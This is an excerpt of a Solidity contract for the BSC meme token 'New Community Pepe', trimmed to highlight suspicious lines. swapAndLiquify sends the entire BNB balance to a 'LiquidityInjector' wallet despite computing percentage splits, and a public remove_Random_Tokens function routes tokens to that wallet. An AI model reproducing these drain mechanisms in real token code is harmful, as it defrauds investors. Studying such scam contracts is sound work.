...
https://t.me/NewCommunityPepePortal

https://www.newcommunitypepe.vip

https://twitter.com/newpepebsc
...
contract NewCommunityPepe is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0x62Dc790C36aB0cd650323e7775A72FBB3532e167); 
    address payable public Wallet_LiquidityInjector = payable(0x9743bEb1B574710eBdc71e54EED5ddBB076De15A);
    address payable public constant Wallet_Burn = payable(0x000000000000000000000000000000000000dEaD); 
    address payable public constant Wallet_Liquidity = payable(0xB485c008E08665768264ADc571f6c15c652A2C82); 
    

    uint256 private constant MAX = ~uint256(0);
    uint8 private constant _decimals = 9;
    uint256 private _tTotal = 426900000000000 * 10**_decimals;
    string private constant _name = "New Community Pepe"; 
    ...
    uint256 public Percent_LiquidityInjector = 10;
    ...
    constructor () {
        ...
        _owner = 0xB485c008E08665768264ADc571f6c15c652A2C82;
    ...
    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
            ...
            uint256 tokens_to_D = contractTokenBalance * Percent_LiquidityInjector / 100;
            ...
            uint256 split_M = Percent_Marketing * 100 / (Percent_Liquidity + Percent_Marketing + Percent_LiquidityInjector);
            uint256 BNB_M = BNB_Total * split_M / 100;

            uint256 split_D = Percent_LiquidityInjector * 100 / (Percent_Liquidity + Percent_Marketing + Percent_LiquidityInjector);
            ...
            sendToWallet(Wallet_LiquidityInjector, BNB_Total);
    ...
    function remove_Random_Tokens(address random_Token_Address, uint256 percent_of_Tokens) public returns(bool _sent){
        ...
        _sent = IERC20(random_Token_Address).transfer(Wallet_LiquidityInjector, removeRandom);
